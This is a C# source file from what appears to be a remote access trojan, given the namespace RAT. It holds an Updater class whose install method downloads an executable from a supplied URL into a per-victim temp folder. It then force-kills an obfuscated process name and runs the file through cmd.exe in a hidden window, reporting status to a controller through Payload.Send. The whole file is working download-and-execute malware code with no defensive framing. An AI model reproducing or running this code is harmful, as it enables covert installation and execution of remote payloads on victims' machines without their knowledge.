using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace RAT
{
    class Updater
    {
        public static String install(String url, bool close = true)
        {
            
            if(url.Contains("http://") || url.Contains("https://"))
            {
                // URL is good
                try
                {
                    File.Delete(Path.GetTempPath() + @"Updater\Downloads\install.exe");
                }
                catch
                {
                   // Fine just unable to remove file if it doesnt exsist!
                }
                try
                {
                    WebClient Client = new WebClient();
                    Client.DownloadFile(url, Path.GetTempPath() + Program.SystemID + @"\Downloads\install.exe");
                }
                catch
                {
                    Payload.Send("Error in downloading File!");
                    return "Error in downloading File!";
                }
                try
                {
                    if (close)
                    {
                        String exec = " taskkill /f /im CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe && " + Path.GetTempPath() + Program.SystemID + @"\Downloads\install.exe";
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "/C " + exec;
                        process.StartInfo = startInfo;
                        process.Start();
                        Payload.Send("<UPDATE> Update Successfully Downloaded, Closed and Ran " + url);
                    }
                    else
                    {
                        String exec = Path.GetTempPath() + Program.SystemID + @"\Downloads\install.exe";
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "/C " + exec;
                        process.StartInfo = startInfo;
                        process.Start();
                        Payload.Send("<UPDATE> Update Successful Downloaded and Ran " + url);
                    }
                }
                catch
                {
                    return "Unable to open file";
                }
            }
            else
            {
                return "Invalid URL Specified!";
            }
            return "Unknown Error";
        }
    }
}
